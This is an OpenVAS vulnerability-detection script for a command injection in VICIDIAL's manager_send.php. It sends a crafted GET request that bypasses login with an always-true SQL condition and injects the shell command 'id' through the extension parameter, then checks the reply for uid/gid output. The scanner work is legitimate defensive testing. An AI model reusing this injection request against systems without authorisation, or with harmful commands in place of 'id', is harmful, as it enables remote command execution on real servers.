###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_vicidial_63288.nasl 11865 2018-10-12 10:03:43Z cfischer $
#
# VICIDIAL 'manager_send.php' Command Injection Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:vicidial:vicidial";

if (description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.103821");
  script_bugtraq_id(63288, 63340);
  script_cve_id("CVE-2013-4468", "CVE-2013-4467");
  script_version("$Revision: 11865 $");
  script_tag(name:"cvss_base", value:"6.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:S/C:P/I:P/A:P");

  script_name("VICIDIAL 'manager_send.php' Command Injection Vulnerability");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/63288");
  script_xref(name:"URL", value:"http://www.vicidial.org/vicidial.php");
  script_xref(name:"URL", value:"http://adamcaudill.com/2013/10/23/vicidial-multiple-vulnerabilities/");

  script_tag(name:"last_modification", value:"$Date: 2018-10-12 12:03:43 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2013-10-25 14:23:59 +0200 (Fri, 25 Oct 2013)");
  script_category(ACT_ATTACK);
  script_tag(name:"qod_type", value:"remote_vul");
  script_family("Web application abuses");
  script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
  script_dependencies("gb_vicidial_detect.nasl");
  script_mandatory_keys("vicidial/installed");

  script_tag(name:"impact", value:"An attacker may leverage this issue to execute arbitrary commands in the
context of the affected application.");

  script_tag(name:"vuldetect", value:"Send a crafted HTTP GET request which tries to execute the 'id'
command.");

  script_tag(name:"insight", value:"In multiple locations, there are calls to passthru() that do not perform
any filtering or sanitization on the input.");

  script_tag(name:"solution", value:"Ask the Vendor for an update.");
  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"summary", value:"VICIDIAL is prone to a command-injection vulnerability because the
application fails to properly sanitize user-supplied input.");

  script_tag(name:"affected", value:"VICIDIAL 2.7RC1, 2.7 and 2.8-403a are vulnerable. Other versions may also
be affected.");

  exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");

if (!port = get_app_port(cpe: CPE))
  exit(0);

cmd = 'id';

foreach user (make_list("VDCL","VDAD")) {
  url = '/agc/manager_send.php?enable_sipsak_messages=1&allow_sipsak_messages=1&protocol=sip&ACTION=OriginateVDRelogin&' +
        'session_name=AAAAAAAAAAAA&server_ip=%27%20OR%20%271%27%20%3D%20%271&extension=%3B' + cmd  + '%3B&user=' +
        user + '&pass=donotedit';

  if(buf = http_vuln_check(port:port, url:url,pattern:"uid=[0-9]+.*gid=[0-9]+")) {
    data = 'It was possible to execute the "id" command.\n\nRequest:\n\n' +
           report_vuln_url(port: port, url: url, url_only: TRUE) + '\n\nResponse:\n\n' + buf + '\n\n';
    security_message(port:port, data:data);
    exit(0);
  }

}

exit(0);
